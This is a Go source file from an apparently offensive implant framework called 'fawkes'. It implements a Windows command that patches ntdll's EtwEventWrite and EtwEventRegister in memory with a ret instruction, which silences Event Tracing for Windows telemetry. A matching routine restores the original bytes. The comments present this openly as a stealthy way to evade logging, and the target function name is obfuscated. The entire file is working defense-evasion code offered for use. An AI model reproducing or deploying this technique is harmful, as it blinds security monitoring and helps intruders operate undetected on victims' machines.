//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"fawkes/pkg/obfuscate"
	"fawkes/pkg/structs"
)

// etwPatchStore tracks original bytes for restore operations.
// Key: "dll!function", Value: original bytes at function entry.
var (
	etwPatchStore = make(map[string][]byte)
	etwPatchMu    sync.Mutex
)

// etwPatch applies in-memory ret patches (0xC3) to targeted ETW functions.
// This is stealthier than the API-based blind action because it patches the
// function in-process — no ETW API calls that might be logged.
// Target options:
//   - "etw" or empty: patches ntdll!EtwEventWrite (most common, disables all ETW)
//   - "etw-register": patches ntdll!EtwEventRegister (prevents new registrations)
//   - "all": patches both EtwEventWrite and EtwEventRegister
func etwPatch(target string) structs.CommandResult {
	if target == "" {
		target = "etw"
	}

	type patchTarget struct {
		dll  string
		fn   string
		desc string
	}

	var targets []patchTarget
	switch strings.ToLower(target) {
	case "etw", "etwwrite":
		targets = []patchTarget{
			{dll: "ntdll.dll", fn: obfuscate.EtwEventWrite(), desc: "ETW event emission"},
		}
	case "etw-register", "etwregister":
		targets = []patchTarget{
			{dll: "ntdll.dll", fn: "EtwEventRegister", desc: "ETW provider registration"},
		}
	case "all":
		targets = []patchTarget{
			{dll: "ntdll.dll", fn: obfuscate.EtwEventWrite(), desc: "ETW event emission"},
			{dll: "ntdll.dll", fn: "EtwEventRegister", desc: "ETW provider registration"},
		}
	default:
		return errorf("Unknown patch target: %s (use etw, etw-register, or all)", target)
	}

	var results []string
	patchCount := 0

	for _, t := range targets {
		key := t.dll + "!" + t.fn

		// Check if already patched
		etwPatchMu.Lock()
		_, alreadyPatched := etwPatchStore[key]
		etwPatchMu.Unlock()
		if alreadyPatched {
			results = append(results, fmt.Sprintf("[=] %s already patched (use restore to undo)", key))
			continue
		}

		// Save original byte and apply ret patch
		origByte, err := patchFunctionEntry(t.dll, t.fn)
		if err != nil {
			results = append(results, fmt.Sprintf("[!] %s: %v", key, err))
			continue
		}

		etwPatchMu.Lock()
		etwPatchStore[key] = origByte
		etwPatchMu.Unlock()

		results = append(results, fmt.Sprintf("[+] Patched %s — %s disabled", key, t.desc))
		patchCount++
	}

	output := strings.Join(results, "\n")
	if patchCount > 0 {
		output += fmt.Sprintf("\n\n%d function(s) patched. ETW telemetry silenced in this process.", patchCount)
		output += "\nUse 'etw -action restore' to undo patches."
	}

	return successResult(output)
}

// etwRestore undoes in-memory patches by writing back original bytes.
func etwRestore(target string) structs.CommandResult {
	etwPatchMu.Lock()
	defer etwPatchMu.Unlock()

	if len(etwPatchStore) == 0 {
		return successResult("No active patches to restore. No ETW functions have been patched in this session.")
	}

	var results []string
	restoreCount := 0

	// If target specified, restore only that; otherwise restore all
	if target != "" && target != "all" {
		// Map shorthand to full key
		keys := resolveTargetKeys(target)
		for _, key := range keys {
			origBytes, exists := etwPatchStore[key]
			if !exists {
				results = append(results, fmt.Sprintf("[=] %s not patched", key))
				continue
			}
			if err := restoreFunctionEntry(key, origBytes); err != nil {
				results = append(results, fmt.Sprintf("[!] %s restore failed: %v", key, err))
				continue
			}
			delete(etwPatchStore, key)
			results = append(results, fmt.Sprintf("[+] Restored %s — original bytes reinstated", key))
			restoreCount++
		}
	} else {
		// Restore all
		for key, origBytes := range etwPatchStore {
			if err := restoreFunctionEntry(key, origBytes); err != nil {
				results = append(results, fmt.Sprintf("[!] %s restore failed: %v", key, err))
				continue
			}
			delete(etwPatchStore, key)
			results = append(results, fmt.Sprintf("[+] Restored %s — original bytes reinstated", key))
			restoreCount++
		}
	}

	output := strings.Join(results, "\n")
	if restoreCount > 0 {
		output += fmt.Sprintf("\n\n%d function(s) restored. ETW telemetry re-enabled.", restoreCount)
	}

	return successResult(output)
}

// patchFunctionEntry applies a ret (0xC3) patch at the function entry point
// and returns the original bytes for later restoration.
func patchFunctionEntry(dllName, funcName string) ([]byte, error) {
	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return nil, fmt.Errorf("failed to load %s: %w", dllName, err)
	}

	proc, err := dll.FindProc(funcName)
	if err != nil {
		return nil, fmt.Errorf("failed to find %s in %s: %w", funcName, dllName, err)
	}

	funcAddr := proc.Addr()

	// Save original byte
	origByte := *(*byte)(unsafe.Pointer(funcAddr))
	origBytes := []byte{origByte}

	// Change memory protection
	procVP := kernel32.NewProc("VirtualProtect")
	var oldProtect uint32
	ret, _, vpErr := procVP.Call(
		funcAddr,
		1,
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("VirtualProtect failed: %w", vpErr)
	}

	// Write ret (0xC3)
	*(*byte)(unsafe.Pointer(funcAddr)) = 0xC3

	// Restore protection
	var discard uint32
	procVP.Call(funcAddr, 1, uintptr(oldProtect), uintptr(unsafe.Pointer(&discard)))

	return origBytes, nil
}

// restoreFunctionEntry restores original bytes at a previously patched function.
func restoreFunctionEntry(key string, origBytes []byte) error {
	parts := strings.SplitN(key, "!", 2)
	if len(parts) != 2 {
		return fmt.Errorf("invalid patch key: %s", key)
	}
	dllName, funcName := parts[0], parts[1]

	dll, err := syscall.LoadDLL(dllName)
	if err != nil {
		return fmt.Errorf("failed to load %s: %w", dllName, err)
	}

	proc, err := dll.FindProc(funcName)
	if err != nil {
		return fmt.Errorf("failed to find %s: %w", funcName, err)
	}

	funcAddr := proc.Addr()

	// Change protection
	procVP := kernel32.NewProc("VirtualProtect")
	var oldProtect uint32
	ret, _, vpErr := procVP.Call(
		funcAddr,
		uintptr(len(origBytes)),
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed: %w", vpErr)
	}

	// Write original bytes
	for i, b := range origBytes {
		*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
	}

	// Restore protection
	var discard uint32
	procVP.Call(funcAddr, uintptr(len(origBytes)), uintptr(oldProtect), uintptr(unsafe.Pointer(&discard)))

	return nil
}

// resolveTargetKeys maps a target shorthand to patch store keys.
func resolveTargetKeys(target string) []string {
	switch strings.ToLower(target) {
	case "etw", "etwwrite":
		return []string{"ntdll.dll!" + obfuscate.EtwEventWrite()}
	case "etw-register", "etwregister":
		return []string{"ntdll.dll!EtwEventRegister"}
	default:
		return []string{target}
	}
}
